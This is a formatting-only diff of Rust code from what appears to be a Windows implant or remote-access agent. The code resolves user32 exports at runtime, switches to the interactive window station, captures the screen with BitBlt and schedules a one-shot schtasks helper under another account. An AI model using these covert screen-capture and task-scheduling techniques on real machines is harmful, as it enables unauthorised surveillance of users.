@@ -363,11 +363,10 @@ struct WinstaGuard {
 unsafe fn attach_interactive() -> Option<WinstaGuard> {
     // Resolve all 7 user32 exports up front as raw addresses; each stage
     // helper below transmutes the ones it calls.
-    let (ows, gpws, spws, odk, std, cd, cws) =
-        match unsafe { attach_interactive_exports() } {
-            Some(e) => e,
-            None => return None,
-        };
+    let (ows, gpws, spws, odk, std, cd, cws) = match unsafe { attach_interactive_exports() } {
+        Some(e) => e,
+        None => return None,
+    };
 
     // Stage 1: save the original station, open WinSta0 and switch to it.
     let (original_winsta, hwinsta) = attach_interactive_open_station(ows, gpws, spws, cws)?;
@@ -390,7 +389,8 @@ unsafe fn attach_interactive() -> Option<WinstaGuard> {
 /// Resolve all 7 user32 exports used by [`attach_interactive`] up front as
 /// raw addresses; each stage helper transmutes the ones it calls. Returns
 /// `None` when any export is missing.
-unsafe fn attach_interactive_exports() -> Option<(usize, usize, usize, usize, usize, usize, usize)> {
+unsafe fn attach_interactive_exports() -> Option<(usize, usize, usize, usize, usize, usize, usize)>
+{
     let ows = match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
         Some(a) => a,
         None => return None,
@@ -912,17 +912,8 @@ fn capture_bmp_dib(
 }
 
 type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-type BitBlt = unsafe extern "system" fn(
-    *mut c_void,
-    i32,
-    i32,
-    i32,
-    i32,
-    *mut c_void,
-    i32,
-    i32,
-    u32,
-) -> i32;
+type BitBlt =
+    unsafe extern "system" fn(*mut c_void, i32, i32, i32, i32, *mut c_void, i32, i32, u32) -> i32;
 type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
 type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
 type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
@@ -951,7 +942,9 @@ fn capture_bmp_blt(
     let do_: DeleteObject = unsafe { core::mem::transmute(do_) };
     let ddc: DeleteDc = unsafe { core::mem::transmute(ddc) };
     let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
-    capture_bmp_blt_bitblt(so, bb, do_, ddc, rdc, mdc, sdc, bmp, ppv_bits, w, h, vsx, vsy)
+    capture_bmp_blt_bitblt(
+        so, bb, do_, ddc, rdc, mdc, sdc, bmp, ppv_bits, w, h, vsx, vsy,
+    )
 }
 
 /// BitBlt the virtual screen into the DIB selected into `mdc`. Returns
@@ -1505,11 +1498,7 @@ unsafe fn run_screenshot_task_schedule(
 
 /// Build the `schtasks /create` command for the one-shot task and run it. On
 /// failure sets `XSESS_FAIL = 5`, deletes the task and returns false.
-unsafe fn run_screenshot_task_create(
-    task_name: &[u16],
-    helper_cmd: &[u16],
-    runas: &[u16],
-) -> bool {
+unsafe fn run_screenshot_task_create(task_name: &[u16], helper_cmd: &[u16], runas: &[u16]) -> bool {
     // Build schtasks /create command.
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
     for &by in b"schtasks /create /tn " {
